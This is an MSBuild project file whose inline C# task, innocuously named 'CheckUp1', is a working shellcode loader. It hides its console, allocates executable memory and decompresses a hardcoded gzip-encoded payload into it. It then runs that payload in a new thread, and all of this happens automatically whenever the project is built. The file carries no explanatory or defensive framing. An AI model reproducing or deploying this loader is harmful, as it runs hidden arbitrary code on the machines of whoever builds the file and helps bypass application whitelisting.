<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
    <Target Name="SomeTask">
        <FragmentExample />
        <CheckUp1 />
    </Target>
    <UsingTask TaskName="FragmentExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
        <ParameterGroup/>
        <Task>
            <Using Namespace="System" />
            <Using Namespace="System.IO" />
            <Code Type="Fragment" Language="cs">
                <![CDATA[]]>
            </Code>
        </Task>
    </UsingTask>
    <UsingTask TaskName="CheckUp1" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
        <Task>
            <Reference Include="System.Management.Automation" />
            <Code Type="Class" Language="cs">
                <![CDATA[
                    using System;
                    using System.Runtime.InteropServices;
                    using System.IO.Compression;
                    using System.IO;
                    using Microsoft.Build.Framework;
                    using Microsoft.Build.Utilities;

                    public class CheckUp1 :  Task, ITask
                    {
                        [DllImport("kernel32.dll", SetLastError = true)]
                        static extern bool FreeConsole();
                        static bool free = FreeConsole();

                        [DllImport("kernel32")]
                        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

                        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                        static extern uint CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

                        [DllImport("kernel32.dll", SetLastError=true)]
                        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

                        public override bool Execute()
                        {
                            IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)10000, (IntPtr)0x3000, (IntPtr)0x40);
                            try
                            {
                                Decompress(ptr, new byte[] { 0x1f, 0x8b, 0x08, 0x00, 0x66, 0xd1, 0x42, 0x5e, 0x02, 0xff, 0xfb, 0xf3, 0xa2, 0x93, 0x81, 0x81, 0x21, 0xa1, 0xf3, 0xa9, 0xe1, 0xa5, 0x94, 0xee, 0x20, 0x83, 0xee, 0x20, 0x9e, 0xee, 0x20, 0x91, 0xee, 0x22, 0x0d, 0xfe, 0xed, 0x5e, 0x6a, 0x86, 0xff, 0x0d, 0x0f, 0xac, 0xb1, 0x49, 0xac, 0x61, 0xd2, 0x51, 0x38, 0x78, 0x9e, 0x97, 0xf1, 0xf8, 0xa3, 0x0f, 0x41, 0xe1, 0xdd, 0x41, 0x02, 0xdd, 0x4e, 0x36, 0x8c, 0x17, 0xba, 0x1d, 0x2a, 0x5a, 0x0f, 0x94, 0x78, 0x31, 0x5e, 0x08, 0xe8, 0xf6, 0x90, 0xe8, 0x8e, 0x50, 0x60, 0xbc, 0xfc, 0xd8, 0xc6, 0xb3, 0xdb, 0xa4, 0x9b, 0xf1, 0x1a, 0x58, 0x17, 0x58, 0xbd, 0xc5, 0x83, 0xd2, 0x2f, 0xcc, 0xb5, 0x3f, 0xac, 0x6b, 0x55, 0x4a, 0x1f, 0x45, 0x74, 0x47, 0xa8, 0x30, 0x5e, 0x4e, 0xeb, 0xe6, 0xf1, 0xee, 0x8e, 0x90, 0x61, 0xbc, 0xdc, 0xcd, 0xd2, 0xcd, 0x78, 0xa1, 0xd3, 0x45, 0x45, 0x25, 0x3a, 0x3a, 0x31, 0x32, 0x2a, 0xf0, 0xff, 0x83, 0x88, 0xf8, 0xa8, 0x6e, 0xa1, 0xd7, 0x6d, 0xb1, 0x86, 0x07, 0xb2, 0x1c, 0xb6, 0x08, 0x64, 0x30, 0x08, 0x30, 0x30, 0x64, 0xfc, 0xff, 0xcf, 0xce, 0x90, 0xc5, 0x90, 0x11, 0xb1, 0x24, 0xf8, 0xe9, 0xff, 0xab, 0xcd, 0x07, 0x1c, 0x3a, 0x8f, 0x07, 0x18, 0x1e, 0xd8, 0x50, 0xb0, 0x25, 0x33, 0x20, 0x23, 0x25, 0xaf, 0x38, 0x31, 0x24, 0xc3, 0xa7, 0x5c, 0x8d, 0xfd, 0xff, 0xd5, 0xdd, 0x89, 0x40, 0x1f, 0xbc, 0xae, 0x8e, 0xe8, 0x3c, 0xd6, 0xfc, 0xde, 0xe1, 0xcf, 0x4e, 0x07, 0x20, 0xef, 0xf3, 0x92, 0xce, 0x1f, 0xcd, 0x2f, 0x1c, 0x1c, 0x1a, 0x7e, 0x57, 0xd5, 0x19, 0x81, 0xe5, 0x3b, 0x24, 0x1c, 0xba, 0x25, 0x9c, 0x3b, 0x24, 0x40, 0x22, 0x52, 0x18, 0x22, 0xec, 0x50, 0x11, 0x0f, 0x0f, 0x28, 0xa3, 0xf3, 0x73, 0xe7, 0xb1, 0x90, 0xe8, 0xe6, 0xd7, 0x2c, 0xc1, 0x59, 0x0c, 0x40, 0x94, 0xe1, 0xc1, 0xc4, 0xc0, 0x90, 0x25, 0x10, 0x90, 0x91, 0x75, 0x72, 0xce, 0xc9, 0xff, 0x57, 0x5b, 0x0f, 0x94, 0x06, 0x76, 0x7e, 0xf0, 0xd8, 0x0c, 0x36, 0xc3, 0xe0, 0x75, 0xc1, 0x8b, 0x86, 0xff, 0xff, 0xff, 0x33, 0x24, 0x26, 0x26, 0xea, 0x15, 0x97, 0x24, 0xa6, 0xa7, 0xea, 0x19, 0x9b, 0x58, 0x98, 0x58, 0x5a, 0x1a, 0xe9, 0xe5, 0x15, 0x1b, 0xea, 0x55, 0xa5, 0xe9, 0xa6, 0xe6, 0xa4, 0x26, 0x97, 0x14, 0xe5, 0xe7, 0x65, 0x26, 0xeb, 0xa5, 0xa4, 0x32, 0x70, 0xad, 0x31, 0x7f, 0x58, 0xcf, 0x74, 0x64, 0xf9, 0x9a, 0x32, 0xdb, 0xad, 0x47, 0xd6, 0x6c, 0x3e, 0x69, 0xfe, 0x2a, 0x49, 0x55, 0x38, 0xd1, 0x8e, 0x09, 0x68, 0x60, 0x37, 0x87, 0x63, 0x07, 0x47, 0xc3, 0xcf, 0xf8, 0x3a, 0xf6, 0x8c, 0x0f, 0x5b, 0x17, 0x85, 0xfd, 0xbf, 0x9a, 0xf1, 0x42, 0x18, 0x18, 0x0e, 0x2e, 0x1f, 0x4c, 0x1f, 0xfc, 0xbf, 0xda, 0xf9, 0xa1, 0x9b, 0xa3, 0xf3, 0xf4, 0x4b, 0x65, 0xa0, 0x55, 0xed, 0xbf, 0xe2, 0xbb, 0xdd, 0x25, 0x9a, 0x7f, 0x30, 0x96, 0x5a, 0x36, 0x1f, 0x97, 0xe9, 0xb6, 0x6f, 0xbf, 0xd7, 0xf9, 0xaf, 0xbb, 0x46, 0x85, 0xc3, 0xf0, 0xe4, 0xc6, 0xff, 0x9f, 0x97, 0x84, 0x87, 0x87, 0x3b, 0xb7, 0xff, 0x0a, 0x0a, 0x0f, 0x6e, 0x7c, 0xf5, 0x1f, 0xe8, 0x99, 0xa0, 0x8c, 0x2f, 0x0c, 0x7d, 0x67, 0xfe, 0x5f, 0x8d, 0x8e, 0x8f, 0xb2, 0x05, 0xf1, 0x6b, 0xd8, 0x5f, 0xde, 0xff, 0xf7, 0xff, 0x7f, 0xe7, 0xf5, 0xc6, 0xe3, 0x40, 0x1e, 0xc3, 0xff, 0xe7, 0xb5, 0xd7, 0xbc, 0x5e, 0x00, 0x00, 0x51, 0x48, 0x41, 0xab, 0x07, 0x02, 0x00, 0x00 });

                                IntPtr threadId = IntPtr.Zero;

                                if (CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, out threadId) == 0x00)
                                    return false;
                                WaitForSingleObject(threadId, 0xFFFFFFFF);

                                System.Threading.Thread.Sleep(-1);

                                return false;
                            }
                            catch (Exception ex){ return false; }
                            return false;
                        }

                        private static void Decompress(IntPtr ptr, byte[] gzip)
                        {
                            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
                            {
                                int pos = 0;
                                byte[] buffer = new byte[15];
                                int count = 0;
                                do
                                {
                                    count = stream.Read(buffer, 0, 15);
                                    if (count > 0)
                                    {
                                        Marshal.Copy(buffer, 0, (IntPtr)((int)ptr+pos), count);
                                        pos += count;
                                    }
                                }
                                while (count > 0);
                            }
                        }
                    }
                ]]>
            </Code>
        </Task>
    </UsingTask>
</Project>
